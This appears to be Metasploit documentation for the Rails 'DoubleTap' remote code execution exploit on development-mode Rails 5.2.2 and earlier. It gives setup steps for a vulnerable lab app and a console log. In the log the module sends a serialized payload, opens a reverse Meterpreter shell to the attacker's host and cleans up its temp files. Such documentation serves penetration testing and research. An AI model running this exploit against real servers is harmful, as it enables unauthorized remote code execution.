# Ruby on Rails DoubleTap Development Mode secret_key_base Vulnerability

## Background

Ruby on Rails is a server-side web application framework written in Ruby. It is a model-view-controller (MVC) architecture, providing default structures for a database, a web service, and web pages. It is also a popular choice of framework among well known services and products such as Github, Bloomberg, Soundcloud, Groupon, Twitch.tv, and of course, Rapid7s Metasploit.

In development mode, Ruby on Rails versions including 5.2.2 and prior are vulnerable to a remote code execution vulnerability due to a predictable secret_key_base based on the name of the Rails application, and use it to create a signed serialized payload, and gain remote code execution.

## Vulnerable Setup

In order to set up a vulnerable box for testing, do this on a Linux machine (such as Ubuntu), and assuming you already have rvm installed:

```
$ rvm gemset create test
$ rvm gemset use test
$ gem install rails '5.2.1'
$ rails new demo
```

Next, `cd` to demo, and then modify the Gemfile like this:

```
$ echo "gem 'rails', '5.2.1'" >> Gemfile
$ echo "gem 'sqlite3', '~> 1.3.6', '< 1.4'" >> Gemfile
$ echo "source 'https://rubygems.org'" >> Gemfile
$ bundle
```

Next, add a new controller:

```
rails generate controller metasploit
```

And add the index method for that controller (under app/controllers/metasploit_controllers.rb):

```
class MetasploitController < ApplicationController
  def index
    render file: "#{Rails.root}/test.html"
  end
end
```

In the root directory, add a new test.html:

```
echo Hello World > test.html
```

Also, add that new route in config/routes.rb:

```
Rails.application.routes.draw do
  resources :metasploit
end
```

And finally, start the application (since no mode is specified, by default, it is development mode):

```
rails s -b 0.0.0.0
```

## Demonstration

### Server

```
$ rails server -b 0.0.0.0 
=> Booting Puma
=> Rails 5.2.1 application starting in development 
=> Run `rails server -h` for more startup options
Puma starting in single mode...
* Version 3.12.1 (ruby 2.6.0-p0), codename: Llamas in Pajamas
* Min threads: 5, max threads: 5
* Environment: development
* Listening on tcp://0.0.0.0:3000
Use Ctrl-C to stop
```

### Metasploit

```
msf5 exploit(multi/http/rails_double_tap) > check
[+] 172.16.249.141:3000 - The target is vulnerable.
msf5 exploit(multi/http/rails_double_tap) > exploit

[*] Started reverse TCP handler on 172.16.249.1:4444 
[*] Attempting to retrieve the application name...
[*] The application name is: Demo
[*] Stager ready: 433 bytes
[*] Sending serialized payload to target (1250 bytes)
[*] Sending stage (985320 bytes) to 172.16.249.141
[*] Meterpreter session 1 opened (172.16.249.1:4444 -> 172.16.249.141:62572) at 2019-04-25 16:29:43 -0500
[+] Deleted /tmp/LsvSGK.bin
[+] Deleted /tmp/tSJfp.bin

meterpreter > getuid
Server username: uid=1000, gid=1000, euid=1000, egid=1000
meterpreter > pwd
/home/sinn3r/demo
meterpreter >
```

